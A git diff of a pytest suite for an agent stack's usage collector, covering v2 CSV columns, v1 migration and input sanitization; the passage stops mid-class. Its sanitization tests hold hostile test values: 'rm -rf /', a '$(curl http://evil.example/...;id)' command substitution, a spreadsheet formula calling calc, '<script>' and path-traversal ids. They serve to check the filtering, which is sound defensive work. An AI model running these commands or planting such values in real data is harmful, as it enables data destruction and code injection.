@@ -5,13 +5,17 @@ Run: uv run --python 3.13 --with pytest --with pandas --with numpy pytest -q tes
 own XDG_STATE_HOME under tmp_path, never the stack's state folder. Hook and collector processes run
 under /usr/bin/python3, the hooks' interpreter.
 """
+import csv
+import hashlib
 import importlib.util
+import io
 import json
 import os
 import signal
 import subprocess
 import sys
 import time
+import types
 from pathlib import Path
 
 import pytest
@@ -32,11 +36,25 @@ def _load(name, path):
 
 
 U = _load("stack_usage", USAGE_PY)
+V1_REV = "910275c"            # the last commit with the v1 collector (runs.csv, COLUMNS of 23 fields)
+
+
+def load_v1(tmp_path):
+    """The v1 collector module, from git history, loaded from a temp file."""
+    p = subprocess.run(["git", "-C", str(ROOT), "show", "%s:dot-claude/hooks/stack_usage.py" % V1_REV],
+                       capture_output=True, text=True)
+    if p.returncode != 0:
+        pytest.skip("commit %s not available: %s" % (V1_REV, p.stderr.strip()[:80]))
+    f = tmp_path / "v1" / "stack_usage_v1.py"
+    f.parent.mkdir(exist_ok=True)
+    f.write_text(p.stdout)
+    return _load("stack_usage_v1", f)
 
 
 @pytest.fixture
 def st(tmp_path, monkeypatch):
     monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "st"))
+    monkeypatch.setenv("HOME", str(tmp_path / "home"))          # no ~/.claude/.stack-manifest.json
     for k in [k for k in os.environ if k.startswith("STACK_")]:
         monkeypatch.delenv(k)
     return tmp_path / "st" / "claude-agent-stack"
@@ -44,8 +62,8 @@ def st(tmp_path, monkeypatch):
 
 def env_for(tmp_path, **extra):
     env = {k: v for k, v in os.environ.items() if not k.startswith("STACK_")}
-    env.update(XDG_STATE_HOME=str(tmp_path / "st"), PYTHONDONTWRITEBYTECODE="1", STACK_USAGE_POLL_S="0.2",
-               STACK_USAGE_REFRESH="0")
+    env.update(XDG_STATE_HOME=str(tmp_path / "st"), HOME=str(tmp_path / "home"), PYTHONDONTWRITEBYTECODE="1",
+               STACK_USAGE_POLL_S="0.2", STACK_USAGE_REFRESH="0")
     env.update(extra)
     return env
 
@@ -58,11 +76,12 @@ def ts(k):
     return time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(T0 + k)) + ".250Z"
 
 
-def call(mid, k, inp=3, out=50, cc=1000, cr=20000, tool=True, text="ok"):
-    content = [{"type": "text", "text": text}]
-    if tool:
-        content.append({"type": "tool_use", "id": "tu_" + mid, "name": "Bash",
-                        "input": {"command": "echo SECRET-TOOL-INPUT sk-ant-api03-XYZ"}})
+def call(mid, k, inp=3, out=50, cc=1000, cr=20000, tool=True, text="ok", content=None):
+    if content is None:
+        content = [{"type": "text", "text": text}]
+        if tool:
+            content.append({"type": "tool_use", "id": "tu_" + mid, "name": "Bash",
+                            "input": {"command": "echo SECRET-TOOL-INPUT sk-ant-api03-XYZ"}})
     return {"type": "assistant", "requestId": "req_" + mid, "timestamp": ts(k), "uuid": "u" + mid,
             "message": {"id": "msg_" + mid, "model": "-".join(("claude", "opus", "5", "5")), "content": content,
                         "usage": {"input_tokens": inp, "output_tokens": out, "cache_creation_input_tokens": cc,
@@ -94,14 +113,15 @@ def agent_lines():
     ]
 
 
-def write_agent(folder, aid, lines, atype="coder", mode="w"):
+def write_agent(folder, aid, lines, atype="coder", mode="w", extra_meta=None):
     folder.mkdir(parents=True, exist_ok=True)
     with open(folder / ("agent-%s.jsonl" % aid), mode) as fh:
         for r in lines:
             fh.write(json.dumps(r) + "\n")
     meta = folder / ("agent-%s.meta.json" % aid)
     if atype and not meta.exists():
-        meta.write_text(json.dumps({"agentType": atype, "description": "SECRET DESCRIPTION"}))
+        meta.write_text(json.dumps(dict({"agentType": atype, "description": "T3 implement the parser"},
+                                        **(extra_meta or {}))))
 
 
 def subdir(tmp_path):
@@ -110,6 +130,14 @@ def subdir(tmp_path):
 
 def rows_by_key():
     return U.read_rows()
+
+
+def v2_row(**kw):
+    """A complete v2 row with every column present (empty unless given)."""
+    r = {c: "" for c in U.COLUMNS}
+    r.update(schema_version=2, session=SID, id="x1", type="scout", seg=0, status="complete", src="measured")
+    r.update(kw)
+    return r
 
 
 # ---------------------------------------------------------------- parsing and rows
@@ -170,7 +198,7 @@ def test_idempotent_rows_and_last_row_wins(st, tmp_path):
     assert rows == [] and not grew                      # nothing new: nothing appended
     rows, _ = U.scan_once(SID, str(sub), final=True)    # the session ended
     assert [r["status"] for r in rows] == ["complete"] and rows[0]["turn_limited"] == 1
-    csv_lines = (st / "usage" / "runs.csv").read_text().splitlines()
+    csv_lines = (st / "usage" / "runs2.csv").read_text().splitlines()
     assert csv_lines[0] == ",".join(U.COLUMNS) and len(csv_lines) == 3
     r = rows_by_key()
     assert len(r) == 1 and r[(SID, "i1", 0)]["status"] == "complete"
@@ -180,13 +208,14 @@ def test_idempotent_rows_and_last_row_wins(st, tmp_path):
 
 def test_rotation_keeps_last_rows(st, tmp_path, monkeypatch):
     monkeypatch.setenv("STACK_USAGE_MAX_BYTES", "3000")
-    base = dict({c: 0 for c in U.COLUMNS}, schema_version=1, session=SID, type="scout", seg=0, last_ts=T0)
+    base = dict(v2_row(), last_ts=T0, ctx=0)
     for i in range(60):
         U.append_rows([dict(base, id="r%d" % (i % 7), status="partial" if i < 53 else "complete", api_calls=i)])
     for i in range(80):
         U.append_rows([dict(base, id="k%d" % i, status="partial", api_calls=i)])
     U.append_rows([dict(base, id="k0", status="complete", api_calls=1000)])
-    assert (st / "usage" / "runs.1.csv").exists() and os.path.getsize(st / "usage" / "runs.csv") <= 3200
+    assert (st / "usage" / "runs2.1.csv").exists() and os.path.getsize(st / "usage" / "runs2.csv") <= 3200
+    assert not (st / "usage" / "runs.csv").exists() and not (st / "usage" / "runs.1.csv").exists()
     r = rows_by_key()
     assert len(r) == 87 and r[(SID, "k0", 0)]["status"] == "complete" and r[(SID, "k0", 0)]["api_calls"] == "1000"
     assert sorted(int(r[(SID, "r%d" % i, 0)]["api_calls"]) for i in range(7)) == list(range(53, 60))
@@ -205,13 +234,13 @@ def test_no_text_in_rows(st, tmp_path):
     write_agent(sub, "t1", agent_lines())
     write_agent(sub, "t2", agent_lines()[:6], atype="Not a valid type; rm -rf /")
     U.scan_once(SID, str(sub), final=True)
-    raw = (st / "usage" / "runs.csv").read_text()
-    for secret in ("SECRET", "sk-ant", "hunter2", "FINAL REPORT", "echo", "DESCRIPTION", "rm -rf"):
+    raw = (st / "usage" / "runs2.csv").read_text()
+    for secret in ("SECRET", "sk-ant", "hunter2", "FINAL REPORT", "echo", "rm -rf"):
         assert secret not in raw
     for r in rows_by_key().values():
         for c, v in r.items():
             if c in U.STRING_COLUMNS:
-                assert U.ID_RE.match(v) or U.TYPE_RE.match(v) or v in ("(unknown)", "partial", "complete"), (c, v)
+                assert v == "" or U.valid_cell(c, v), (c, v)
             elif v != "":
                 float(v)                                # every other field is a number
     state = (st / "usage" / "sessions" / SID / "state.json").read_text()
@@ -428,8 +457,12 @@ def test_propose_prints_only(st, tmp_path):
 LOOKUP = ("scout", "claude-code-guide", "oracle", "explore", "mcp-broker")
 
 
+V1 = None
+
+
 @pytest.fixture
 def refit(tmp_path):
+    global V1
     np = pytest.importorskip("numpy")
     pd = pytest.importorskip("pandas")
     sys.path.insert(0, str(ROOT / "tests"))
@@ -440,6 +473,7 @@ def refit(tmp_path):
     for t in LOOKUP:
         (agents / (t + ".md")).write_text("---\nname: %s\nmodel: sonnet\nmaxTurns: 40\n---\n" % t)
     fm = D.frontmatter(str(agents))
+    V1 = load_v1(tmp_path)
 
     def segs(atype, n_agents, calls, seed, session):
         rng = np.random.default_rng(seed)
@@ -457,10 +491,15 @@ def refit(tmp_path):
     return dict(R=R, D=D, segs=segs, shipped=shipped, path=path, agents=agents)
 
 
+def v1_append(rows):
+    """Rows of the v1 history (runs.csv), written the way the v1 collector did."""
+    V1.append_rows(rows)
+
+
 def csv_rows(df):
     out = []
     for r in df.itertuples():
-        out.append(dict((c, 0) for c in U.COLUMNS))
+        out.append(dict((c, 0) for c in V1.COLUMNS))
         out[-1].update(schema_version=1, session=r.session, id=r.id, type=r.type, seg=r.seg, status="complete",
                        api_calls=r.api_calls, ctx=r.ctx, first_cc=r.first_cc, first_ts=T0, last_ts=T0 + r.wall_s,
                        wall_s=r.wall_s, prev_peak="", gap_s="")
@@ -475,12 +514,12 @@ def do_refresh(k, st):
 def test_refresh_provisional_to_supported(st, tmp_path, refit):
     k = refit
     assert k["shipped"]["types"]["scout"]["status"] == "provisional"          # 3 segments
-    U.append_rows(csv_rows(k["segs"]("scout", 2, 20.0, 9, "new1")))          # 2 more agents: the new
+    v1_append(csv_rows(k["segs"]("scout", 2, 20.0, 9, "new1")))          # 2 more agents: the new
     J = do_refresh(k, st)                                                    # lookup pool is not gated
     assert J["types"]["scout"]["status"] == "provisional" and J["types"]["scout"]["evidence"]["n_seg_seen"] == 2
     assert J["types"]["scout"]["n_seg"] == 3
-    U.append_rows(csv_rows(k["segs"]("scout", 1, 20.0, 12, "new1")))
-    U.append_rows(csv_rows(k["segs"]("claude-code-guide", 4, 20.0, 13, "new1")))
+    v1_append(csv_rows(k["segs"]("scout", 1, 20.0, 12, "new1")))
+    v1_append(csv_rows(k["segs"]("claude-code-guide", 4, 20.0, 13, "new1")))
     J = do_refresh(k, st)
     sc = J["types"]["scout"]
     assert sc["status"] == "supported" and sc["n_seg"] == 6 and sc["n_agents"] == 6
@@ -490,7 +529,7 @@ def test_refresh_provisional_to_supported(st, tmp_path, refit):
     saved = json.loads((st / "sched_model.json").read_text())
     assert saved["types"]["scout"]["status"] == "supported" and saved["refresh"]["base_generated"] == k["shipped"]["generated"]
     # the shipped sessions are never counted twice
-    U.append_rows(csv_rows(k["segs"]("scout", 4, 20.0, 10, "ship1")))
+    v1_append(csv_rows(k["segs"]("scout", 4, 20.0, 10, "ship1")))
     assert do_refresh(k, st)["types"]["scout"]["n_seg"] == 6
 
 
@@ -498,7 +537,7 @@ def test_refresh_bounded_step_and_narrowing(st, tmp_path, refit):
     k = refit
     m0 = k["shipped"]["types"]["claude-code-guide"]
     w0 = m0["band"]["turns"]["hi"] / m0["band"]["turns"]["med"]
-    U.append_rows(csv_rows(k["segs"]("claude-code-guide", 40, 200.0, 11, "new2")))   # 10x the turns
+    v1_append(csv_rows(k["segs"]("claude-code-guide", 40, 200.0, 11, "new2")))   # 10x the turns
     J1 = do_refresh(k, st)
     m1 = J1["types"]["claude-code-guide"]
     assert m0["turns"]["M"] * 1.4 < m1["turns"]["M"] <= m0["turns"]["M"] * 1.5 + 0.1
@@ -515,3 +554,387 @@ def test_refresh_bounded_step_and_narrowing(st, tmp_path, refit):
                             ["new2"], 40)["types"]["claude-code-guide"]
     assert m["turns"]["M"] == pytest.approx(target["turns"]["M"], rel=0.02)          # converged
     assert m["band"]["turns"]["hi"] / m["band"]["turns"]["med"] < w0                  # narrower with n
+
+
+# ---------------------------------------------------------------- collector v2: columns, provenance, migration
+REAL_SCAN = U.scan_once
+
+
+def t_(k):
+    return T0 + k + 0.25                                   # the epoch of ts(k)
+
+
+def write_main(tmp_path, lines):
+    main = tmp_path / "projects" / "p" / (SID + ".jsonl")
+    main.parent.mkdir(parents=True, exist_ok=True)
+    with open(main, "w") as fh:
+        for r in lines:
+            fh.write(json.dumps(r) + "\n")
+    return main
+
+
+def tu(tid, name, **inp):
+    return {"type": "tool_use", "id": tid, "name": name, "input": inp}
+
+
+def txt(t):
+    return {"type": "text", "text": t}
+
+
+def scan_final(tmp_path, **kw):
+    U.scan_once(SID, str(subdir(tmp_path)), final=True, **kw)
+    return rows_by_key()
+
+
+def test_tool_counts_writes_and_first_write(st, tmp_path):
+    c1 = call("c1", 1, cc=7000, cr=1000, content=[
+        txt("thinking"), tu("r1", "Read", file_path="/repo/a.py"), tu("e1", "Edit", file_path="/repo/src/a.py"),
+        tu("g1", "Bash", command="cd x && git -C /repo commit -m 'secret msg'")])
+    c1_stream = dict(c1, message=dict(c1["message"], usage=dict(c1["message"]["usage"], output_tokens=99)))
+    c2 = call("c2", 3, cc=300, cr=9000, content=[
+        tu("w1", "Write", file_path="/private/tmp/claude-501/scratch/n.md"), tu("m1", "mcp__srv__tool"),
+        tu("a1", "Agent", description="x"), tu("o1", "Mystery"), tu("e2", "MultiEdit", file_path="/repo/src/a.py"),
+        tu("w2", "Write", file_path="/repo/b.py"), tu("n1", "NotebookEdit", notebook_path="/repo/n.ipynb"),
+        tu("q1", "Bash", command="echo 'git commit' mention only")])
+    c3 = call("c3", 5, cc=10, cr=9500, tool=False, text="STATUS: blocked\nRESULT: no")
+    lines = [user("go", 0), c1, c1_stream, result(2), c2, result(4), c3]
+    write_agent(subdir(tmp_path), "t1", lines, atype="code-reviewer",
+                extra_meta={"parentAgentId": "ab12", "spawnDepth": 2})
+    r = scan_final(tmp_path)[(SID, "t1", 0)]
+    n = {k: int(r[k]) for k in U.TOOL_COLS + ["tool_calls"]}
+    assert n == dict(n_read=1, n_write=2, n_edit=2, n_notebook=1, n_bash=2, n_grep=0, n_glob=0, n_agent=1, n_send=0,
+                     n_skill=0, n_toolsearch=0, n_webfetch=0, n_websearch=0, n_lsp=0, n_mcp=1, n_other=1,
+                     tool_calls=11)                              # the streamed duplicate of c1 counts once
+    assert (r["files_written"], r["files_written_repo"], r["git_commits"]) == ("4", "3", "1")
+    assert r["first_write_call"] == "1" and r["first_ctx"] == r["ctx_at_first_write"] == str(3 + 7000 + 1000)
+    assert r["ro_write"] == "1" and r["status_code"] == "2"      # a read-only type that wrote repo files
+    assert (r["resume"], r["cold"], r["parent"], r["depth"], r["node"]) == ("0", "", "ab12", "2", "T3")
+    assert r["task"] == "T3 implement the parser" and r["is_main"] == "0" and r["src"] == "measured"
+    raw = (st / "usage" / "runs2.csv").read_text()
+    for leak in ("secret msg", "/repo", "a.py", "git commit", "scratch"):
+        assert leak not in raw
+
+
+def test_resume_cold_and_empty_without_meta(st, tmp_path):
+    write_agent(subdir(tmp_path), "m0", agent_lines(), atype=None)         # no meta file at all
+    r = scan_final(tmp_path)
+    s0, s1 = r[(SID, "m0", 0)], r[(SID, "m0", 1)]
+    assert s1["resume"] == "1" and s1["cold"] == "1"              # first_cr 1000 < 0.5 * prev_peak 16103
+    assert (s0["parent"], s0["depth"], s0["node"], s0["task"], s0["ro_write"]) == ("", "", "", "", "")
+    assert s0["type"] == "(unknown)" and s0["resume"] == "0" and s0["cold"] == ""
+
+
+def test_status_code_rules(st, tmp_path):
+    sub = subdir(tmp_path)
+    cases = {
+        "sdone": [user("go", 0), call("d1", 1), result(2), call("d2", 3, tool=False, text="STATUS: done\nRESULT: x")],
+        "spart": [user("go", 0), call("p1", 1), result(2), call("p2", 3, tool=False, text="Below.\nSTATUS: partial")],
+        "sclean": [user("go", 0), call("c1", 1), result(2), call("c2", 3, tool=False, text="in · 2026-10-03\nok")],
+        "stool": [user("go", 0), call("t1", 1), result(2), call("t2", 3)],
+        "sres": [user("go", 0), call("r1", 1), result(2)]}
+    for aid, ls in cases.items():
+        write_agent(sub, aid, ls)
+    r = scan_final(tmp_path)
+    got = {aid: r[(SID, aid, 0)]["status_code"] for aid in cases}
+    assert got == {"sdone": "0", "spart": "1", "sclean": "0", "stool": "", "sres": "1"}   # sres: turn_limited
+    assert r[(SID, "sres", 0)]["turn_limited"] == "1"
+    # a segment still open (fresh transcript, no final scan) has no status yet; a text-only end is complete
+    U.scan_once(SID, str(sub), final=False)
+    r = rows_by_key()
+    assert r[(SID, "stool", 0)]["status"] == "partial" and r[(SID, "stool", 0)]["status_code"] == ""
+    assert r[(SID, "sdone", 0)]["status"] == "complete" and r[(SID, "sdone", 0)]["status_code"] == "0"
+
+
+def test_main_rows_windows_and_session_row(st, tmp_path):
+    def human(k, pid=None, **kw):
+        return dict(user("prompt %d" % k, k), promptId=pid, **kw)
+    sdir = st / SID
+    sdir.mkdir(parents=True)
+    (sdir / "budget.json").write_text(json.dumps({"total": 777000}))
+    write_main(tmp_path, [
+        human(0, "pid-0"), call("m1", 1, content=[tu("x1", "Read", file_path="/r"), tu("x2", "Agent")]),
+        call("m2", 2, tool=False), human(10, "pid-1"), human(10, "pid-1"),          # a replayed duplicate
+        dict(user("meta", 11), isMeta=True), result(11), user("<task-notification>x</task-notification>", 12),
+        call("m3", 13, content=[tu("x3", "Bash", command="ls")]), human(20, "pid-2")])   # window 2 has no call
+    write_agent(subdir(tmp_path), "w1", [user("go", 0), call("w1", 14, tool=False)])
+    write_agent(subdir(tmp_path), "w0", [user("go", 0), call("w0", 1, tool=False)])
+    r = scan_final(tmp_path)
+    m0, m1 = r[(SID, "main", 0)], r[(SID, "main", 1)]
+    assert (SID, "main", 2) not in r
+    assert (m0["type"], m0["is_main"], m0["depth"], m0["resume"], m0["window"], m0["parent"]) == (
+        "blackcat", "1", "0", "0", "0", "")
+    assert (m0["api_calls"], m0["n_read"], m0["n_agent"], m0["tool_calls"]) == ("2", "1", "1", "2")
+    assert (m1["api_calls"], m1["n_bash"], m1["window"], m1["status"]) == ("1", "1", "1", "complete")
+    assert (m0["status_code"], m0["cold"], m0["prev_peak"], m0["gap_s"]) == ("", "", "", "")
+    assert r[(SID, "w1", 0)]["window"] == "1" and r[(SID, "w0", 0)]["window"] == "0"
+    sess = r[(SID, "session", 0)]
+    assert (sess["type"], sess["is_main"], sess["ctx"], sess["window_ctx"]) == ("blackcat", "1", "777000", "")
+    assert float(sess["first_ts"]) == pytest.approx(t_(1)) and float(sess["last_ts"]) == pytest.approx(t_(14))
+    assert sess["api_calls"] == "" and sess["input"] == ""            # only what the budget measured
+    assert {k[1] for k in r} == {"main", "session", "w0", "w1"}
+    assert {a["id"] for a in U.runs_view(U.read_rows())} == {"w0", "w1"}
+
+
+def test_hits_and_window_ctx_empty_until_the_guard_files_exist(st, tmp_path):
+    def human(k, pid):
+        return dict(user("prompt", k), promptId=pid)
+    write_main(tmp_path, [human(0, "pid-0"), call("m1", 1), human(10, "pid-1"), call("m2", 11)])
+    write_agent(subdir(tmp_path), "h1", [user("go", 0), call("h1", 12, tool=False)])
+    sub = str(subdir(tmp_path))
+    rows, _ = U.scan({"v": 2, "agents": {}}, SID, sub, final=False)
+    r = {(x["id"], x["seg"]): x for x in rows}
+    for k in (("main", 0), ("main", 1), ("h1", 0)):
+        assert all(r[k][c] == "" for c in U.HIT_COLS + ["window_ctx"]), k      # nothing measured: empty, not 0
+    sdir = st / SID
+    sdir.mkdir(parents=True)
+    snap = "0123456789abcdef"
+    hits = [{"v": 1, "ts": t_(12.5), "agent_id": "h1", "agent_type": "coder", "run": None, "kind": "turn",
+             "value": 40, "limit": 40, "snap": snap},
+            {"v": 1, "ts": t_(11.5), "agent_id": None, "agent_type": "blackcat", "run": None,
+             "kind": "soft_prompt", "value": 9, "limit": 8, "snap": snap},
+            {"v": 2, "ts": t_(12), "agent_id": "h1", "kind": "mcp"},                  # wrong schema version
+            {"v": 1, "ts": t_(12), "agent_id": "../x", "kind": "mcp"},                # bad id
+            {"v": 1, "ts": "x", "agent_id": "h1", "kind": "hard_agent"},              # bad ts
+            {"v": 1, "ts": t_(50), "agent_id": "h1", "kind": "hard_agent"}]           # outside the segment
+    (sdir / "limit-hits.jsonl").write_text("\n".join(json.dumps(h) for h in hits) + "\nnot json\n")
+    pw = [{"v": 1, "ts": t_(0), "prompt_id": "pid-0", "base": 0},
+          {"v": 1, "ts": t_(10), "prompt_id": "pid-1", "base": 100}, {"v": 1, "ts": "x", "base": 5}]
+    (sdir / "prompt-windows.jsonl").write_text("\n".join(json.dumps(w) for w in pw) + "\n")
+    (sdir / "budget.json").write_text(json.dumps({"total": 350}))
+    rows, _ = U.scan({"v": 2, "agents": {}}, SID, sub, final=False)
+    r = {(x["id"], x["seg"]): x for x in rows}
+    h1, m0, m1 = r[("h1", 0)], r[("main", 0)], r[("main", 1)]
+    assert [h1[c] for c in U.HIT_COLS] == [0, 1, 0, 0, 0, 0]
+    assert [m0[c] for c in U.HIT_COLS] == [0] * 6
+    assert [m1[c] for c in U.HIT_COLS] == [1, 0, 0, 0, 0, 0]
+    assert (m0["window_ctx"], m1["window_ctx"], h1["window_ctx"]) == (100, 250, "")
+
+
+def test_task_sanitized_and_node(st, tmp_path):
+    cases = {"k1": ("P9d fix `rm -rf /` $(curl http://evil.example/x?a=b;id) <b>" + "z" * 80, "P9d"),
+             "k2": ("Fix the thing", ""), "k3": ("!!! ??? \n", ""), "k4": ("S1e", "S1e"), "k5": ("t3 lower", ""),
+             "k6": ("TOOLONG9 x", ""), "k7": ("A12345 x", "")}
+    for aid, (desc, _) in cases.items():
+        write_agent(subdir(tmp_path), aid, [user("go", 0), call(aid, 1, tool=False)], extra_meta={"description": desc})
+    write_agent(subdir(tmp_path), "k8", [user("go", 0), call("k8", 1, tool=False)],
+                extra_meta={"description": 5, "spawnDepth": True})
+    r = scan_final(tmp_path)
+    for aid, (_, node) in cases.items():
+        row = r[(SID, aid, 0)]
+        assert row["node"] == node and len(row["task"]) <= 60 and U.TASK_DROP_RE.search(row["task"]) is None, aid
+        assert row["task"] == "" or U.TASK_RE.match(row["task"])
+    assert r[(SID, "k1", 0)]["task"].startswith("P9d fix rm -rf / curl http://evil.example/xabid")
+    assert r[(SID, "k2", 0)]["task"] == "Fix the thing" and r[(SID, "k3", 0)]["task"] == ""
+    assert (r[(SID, "k8", 0)]["task"], r[(SID, "k8", 0)]["depth"]) == ("", "")
+
+
+def test_stack_commit_from_manifest(st, tmp_path):
+    man = tmp_path / "home" / ".claude" / ".stack-manifest.json"
+    man.parent.mkdir(parents=True)
+    write_agent(subdir(tmp_path), "c1", agent_lines()[:4])
+    assert scan_final(tmp_path)[(SID, "c1", 0)]["stack_commit"] == ""                        # no manifest
+    full = "1dea215d9a6ac5aab48efeea879ccd6a7fed30fa"
+    for body, want in (('{"commit": "%s"}' % full, full), ("not json", ""), ('{"commit": "HEAD; rm -rf /"}', ""),
+                       ('{"commit": 5}', ""), ("[]", "")):
+        man.write_text(body)
+        assert U.read_stack_commit() == want, body
+
+
+def test_T22_append_only_provenance(st, tmp_path):
+    full = "1dea215d9a6ac5aab48efeea879ccd6a7fed30fa"
+    man = tmp_path / "home" / ".claude" / ".stack-manifest.json"
+    man.parent.mkdir(parents=True)
+    man.write_text('{"commit": "%s"}' % full)
+    sub = subdir(tmp_path)
+    write_main(tmp_path, [dict(user("hi", 0), promptId="p0"), call("m1", 1, tool=False)])
+    write_agent(sub, "q1", agent_lines()[:4], atype=None)
+    U.scan_once(SID, str(sub))
+    f = st / "usage" / "runs2.csv"
+    first = f.read_bytes()
+    rows = rows_by_key()
+    assert {k[1] for k in rows} == {"main", "q1"}
+    for r in rows.values():
+        assert r["src"] == "measured" and r["session"] == SID and r["first_ts"] != ""
+        assert r["stack_commit"] == full and r["schema_version"] == "2"
+        # nothing the collector cannot measure yet is a 0: the guard's files and the snapshot do not exist
+        for c in U.HIT_COLS + ["window_ctx", "sess_src", "snap", "regime"]:
+            assert r[c] == "", c
+    q = rows[(SID, "q1", 0)]
+    assert (q["parent"], q["depth"], q["node"], q["task"], q["cold"], q["first_write_call"],
+            q["ctx_at_first_write"]) == ("",) * 7
+    assert q["status"] == "partial" and q["status_code"] == ""              # open: no status yet
+    # later scans only append: the earlier bytes are untouched
+    write_agent(sub, "q1", agent_lines()[4:], mode="a")
+    write_agent(sub, "q2", agent_lines()[:4], atype="scout")
+    U.scan_once(SID, str(sub), final=True)
+    now = f.read_bytes()
+    assert now.startswith(first) and len(now) > len(first)
+    assert not (st / "usage" / "runs.csv").exists()
+    assert rows_by_key()[(SID, "q2", 0)]["status_code"] == "1"             # ended on a tool result: turn-limited
+
+
+def test_v1_and_v2_writers_coexist(st, tmp_path, monkeypatch):
+    V = load_v1(tmp_path)
+    base1 = {c: 0 for c in V.COLUMNS}
+    expect = {}
+    for i in range(12):
+        ids = "v1x%d" % i
+        V.append_rows([dict(base1, schema_version=1, session=SID, id=ids, type="scout", seg=0, status="complete",
+                            api_calls=i + 1, last_ts=T0 + i, first_ts=T0, prev_peak="", gap_s="")])
+        expect[(SID, ids, 0)] = ("seed_v1", str(i + 1))
+        idw = "v2x%d" % i
+        U.append_rows([v2_row(id=idw, api_calls=100 + i, last_ts=T0 + i, first_ts=T0, stack_commit="1dea215",
+                              task="T%d x" % i, node="T%d" % i)])
+        expect[(SID, idw, 0)] = ("measured", str(100 + i))
+    r = U.read_rows()
+    assert set(r) == set(expect)
+    for k, (src, calls) in expect.items():
+        assert r[k]["src"] == src and r[k]["api_calls"] == calls and set(r[k]) == set(U.COLUMNS)
+    v1row = r[(SID, "v1x3", 0)]
+    assert v1row["schema_version"] == "1" and v1row["tool_calls"] == "" and v1row["status_code"] == ""
+    # the same key in both histories: the v2 row (read later) wins
+    V.append_rows([dict(base1, schema_version=1, session=SID, id="dup", type="scout", seg=0, status="partial",
+                        api_calls=1, prev_peak="", gap_s="")])
+    U.append_rows([v2_row(id="dup", status="complete", api_calls=7)])
+    assert U.read_rows()[(SID, "dup", 0)]["api_calls"] == "7"
+    assert V.read_rows()[(SID, "v1x0", 0)]["api_calls"] == "1"        # the v1 reader still reads its own file
+    # v1 rotation (its own business) never disturbs the v2 files
+    before = (st / "usage" / "runs2.csv").read_bytes()
+    monkeypatch.setenv("STACK_USAGE_MAX_BYTES", "1500")
+    for i in range(30):
+        V.append_rows([dict(base1, schema_version=1, session=SID, id="rot%d" % i, type="scout", seg=0,
+                            status="complete", last_ts=T0 + 50, prev_peak="", gap_s="")])
+    assert (st / "usage" / "runs.1.csv").exists() and (st / "usage" / "runs2.csv").read_bytes() == before
+    assert (SID, "v2x5", 0) in U.read_rows() and (SID, "rot29", 0) in U.read_rows()
+
+
+def sha(p):
+    return hashlib.sha256(Path(p).read_bytes()).hexdigest()
+
+
+def test_migration_unknown_header_set_aside_and_v1_files_untouched(st, tmp_path, monkeypatch):
+    V = load_v1(tmp_path)
+    base1 = {c: 0 for c in V.COLUMNS}
+    for i in range(4):
+        V.append_rows([dict(base1, schema_version=1, session=SID, id="old%d" % i, type="scout", seg=0,
+                            status="complete", prev_peak="", gap_s="")])
+    u = st / "usage"
+    (u / "runs.1.csv").write_text((u / "runs.csv").read_text())
+    (u / "runs.old-schema.csv").write_text("a,b\n1,2\n")
+    v1_files = {n: sha(u / n) for n in ("runs.csv", "runs.1.csv", "runs.old-schema.csv")}
+    (u / "runs2.csv").write_text("schema_version,session,id\n2,%s,zzz\n" % SID)           # an unknown header
+    monkeypatch.setattr(U, "time", types.SimpleNamespace(time=lambda: 1790000123.9, sleep=time.sleep))
+    U.append_rows([v2_row(id="n1")])
+    aside = u / "runs2.old-schema-1790000123.csv"
+    assert aside.read_text().endswith("2,%s,zzz\n" % SID)
+    assert (u / "runs2.csv").read_text().splitlines()[0] == ",".join(U.COLUMNS)
+    assert (SID, "zzz", 0) not in U.read_rows() and (SID, "n1", 0) in U.read_rows()
+    first_aside = aside.read_bytes()
+    (u / "runs2.csv").write_text("other,header\n1,2\n")                                    # again, same second
+    U.append_rows([v2_row(id="n2")])
+    assert aside.read_bytes() == first_aside and (u / "runs2.old-schema-1790000123-1.csv").exists()
+    assert {k[1] for k in U.read_rows() if k[1].startswith("n")} == {"n2"}
+    # v2 rotation and appends never touch the v1 files, even when runs.csv is over the cap
+    monkeypatch.setenv("STACK_USAGE_MAX_BYTES", "400")
+    for i in range(20):
+        U.append_rows([v2_row(id="big%d" % i, last_ts=T0 + i)])
+    assert (u / "runs2.1.csv").exists()
+    assert {n: sha(u / n) for n in v1_files} == v1_files
+    assert sorted(p.name for p in u.iterdir() if p.name.endswith(".csv") and p.name.startswith("runs.")) == [
+        "runs.1.csv", "runs.csv", "runs.old-schema.csv"]
+    assert U.read_rows()[(SID, "old2", 0)]["src"] == "seed_v1"
+
+
+def test_hostile_csv_is_filtered_by_the_reader_and_writer(st, tmp_path):
+    u = st / "usage"
+    u.mkdir(parents=True)
+    good = v2_row(id="good", parent="main", node="T3", task="a b", snap="0123456789abcdef", sess_src="resume",
+                  regime="fedcba9876543210", stack_commit="abcdef1", api_calls=5)
+    bad = v2_row(id="opt", parent="../../x", node="lower", task="<script>", snap="XYZ", sess_src="boot",
+                 regime="1234", stack_commit="HEAD", src="evil", api_calls=6)
+    rows = [good, bad, v2_row(id="../etc"), v2_row(id="ty", type="a;b"), v2_row(id="st", status="weird"),
+            v2_row(id="seg", seg="x"), dict(v2_row(id="v3"), schema_version=3),
+            dict(v2_row(id="v1"), schema_version=1)]
+    buf = io.StringIO()
+    w = csv.DictWriter(buf, fieldnames=U.COLUMNS, lineterminator="\n")
+    w.writeheader()
+    w.writerows(rows)
+    (u / "runs2.csv").write_text(buf.getvalue() + "short,row\n" + "\x00garbage\n")
+    r = U.read_rows()
+    assert {k[1] for k in r} == {"good", "opt"}
+    g, o = r[(SID, "good", 0)], r[(SID, "opt", 0)]
+    assert (g["parent"], g["node"], g["task"], g["snap"], g["sess_src"], g["regime"], g["stack_commit"]) == (
+        "main", "T3", "a b", "0123456789abcdef", "resume", "fedcba9876543210", "abcdef1")
+    assert all(o[c] == "" for c in U.OPTIONAL_STRINGS) and o["api_calls"] == "6"
+    # the writer blanks an invalid optional cell as well: a formula, a newline or a comma in `task`
+    U.append_rows([v2_row(id="w1", task="=cmd|' /C calc'!A0", parent="a b", stack_commit="zz"),
+                   v2_row(id="w2", task="line1\nline2,x")])
+    raw = (u / "runs2.csv").read_text()
+    assert "calc" not in raw and "line1" not in raw
+    r = U.read_rows()
+    assert r[(SID, "w1", 0)]["task"] == "" and r[(SID, "w1", 0)]["parent"] == "" and r[(SID, "w2", 0)]["task"] == ""
+
+
+class FakeLimits:
+    def __init__(self, order, boom=None):
+        self.order, self.boom = order, boom
+
+    def propose(self, *a, **k):
+        self.order.append("propose")
